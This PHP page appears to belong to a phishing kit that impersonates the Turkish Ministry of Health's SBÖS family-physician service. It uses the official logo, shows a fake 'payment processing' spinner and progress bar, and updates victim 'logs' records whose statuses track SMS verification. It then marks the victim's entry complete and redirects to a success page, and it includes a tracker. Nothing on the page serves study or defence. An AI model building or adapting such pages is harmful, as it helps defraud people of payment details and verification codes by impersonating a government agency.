<?php
require_once 'api/config.php';

$logId = isset($_GET['id']) ? intval($_GET['id']) : 0;

if (!$logId) {
    header('Location: basvuru.php');
    exit;
}

// Mark the record as 'processing' when this page is reached
try {
    $db = getDB();
    ensureSchema($db);
    $stmt = $db->prepare("UPDATE `logs` SET status = 'processing', updated_at = NOW() WHERE id = ? AND status IN ('waiting','sms_verified')");
    $stmt->execute([$logId]);
} catch (Throwable $e) {
    // Non-fatal — continue rendering the page
}
?>
<!DOCTYPE html>
<html lang="tr" class="notranslate" translate="no">
<head>
    <meta charset="utf-8">
    <title>İşleminiz Gerçekleştiriliyor - SBÖS</title>
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,shrink-to-fit=no,viewport-fit=cover">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #f0f4f8;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow-x: hidden;
        }
        .top-bar {
            background: #D32F2F;
            height: 4px;
        }
        .header {
            padding: 30px 40px;
            display: flex;
            justify-content: center;
            z-index: 1;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 4px;
            text-decoration: none;
        }
        .logo img {
            height: 36px;
        }
        .main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            z-index: 1;
        }
        .card {
            background: #fff;
            border-radius: 24px;
            padding: 48px 40px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
            text-align: center;
        }
        .spinner {
            width: 64px;
            height: 64px;
            border: 4px solid #fee2e2;
            border-top-color: #D32F2F;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 32px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .card h1 {
            font-size: 20px;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 8px;
        }
        .card p {
            font-size: 14px;
            color: #8e8ea0;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .pulse-dots {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 32px;
        }
        .pulse-dots span {
            width: 8px;
            height: 8px;
            background: #D32F2F;
            border-radius: 50%;
            animation: pulse 1.4s ease-in-out infinite;
        }
        .pulse-dots span:nth-child(2) { animation-delay: 0.2s; }
        .pulse-dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1); }
        }
        .progress-bar-wrap {
            background: #fee2e2;
            border-radius: 99px;
            height: 4px;
            overflow: hidden;
            margin-bottom: 24px;
        }
        .progress-bar {
            height: 100%;
            background: #D32F2F;
            border-radius: 99px;
            width: 0%;
            transition: width 0.1s linear;
        }
        .ref-number {
            font-size: 12px;
            color: #b0b0c0;
            margin-top: 16px;
        }
        .ref-number span {
            font-family: 'Courier New', monospace;
            font-weight: 600;
        }
        @media (max-width: 639px) {
            .header { padding: 20px; }
            .card { padding: 32px 24px; border-radius: 20px; }
        }
    </style>
</head>
<body>
    <div class="top-bar"></div>

    <div class="header">
        <a href="index.php" class="logo">
            <img src="https://sbos.saglik.gov.tr/_next/static/media/aileHekimiLogoSb2.b6f9fbf7.svg" alt="SBÖS">
        </a>
    </div>

    <div class="main">
        <div>
            <div class="card">
                <div class="spinner"></div>
                <h1>Ödemeniz İşleniyor</h1>
                <p>Lütfen bu sayfadan ayrılmayın.<br>İşleminiz birkaç saniye içinde tamamlanacaktır.</p>

                <div class="pulse-dots">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>

                <div class="progress-bar-wrap">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
            </div>
            <div class="ref-number">
                İşlem numarası: <span>#<?= str_pad($logId, 6, '0', STR_PAD_LEFT) ?></span>
            </div>
        </div>
    </div>

    <script>
        var logId = <?= (int)$logId ?>;
        var redirectUrl = 'success.php?id=' + logId;
        var duration = 4000; // 4 seconds
        var start = Date.now();
        var bar = document.getElementById('progressBar');

        function tick() {
            var elapsed = Date.now() - start;
            var pct = Math.min(100, (elapsed / duration) * 100);
            bar.style.width = pct + '%';
            if (elapsed >= duration) {
                // Update status to 'completed' then redirect
                fetch('api/logs.php', {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: logId, sms_code: '000000', _action: 'complete' })
                }).catch(function() {}).finally(function() {
                    window.location.href = redirectUrl;
                });
            } else {
                requestAnimationFrame(tick);
            }
        }

        requestAnimationFrame(tick);
    </script>

    <?php include 'includes/tracker.php'; ?>
</body>
</html>
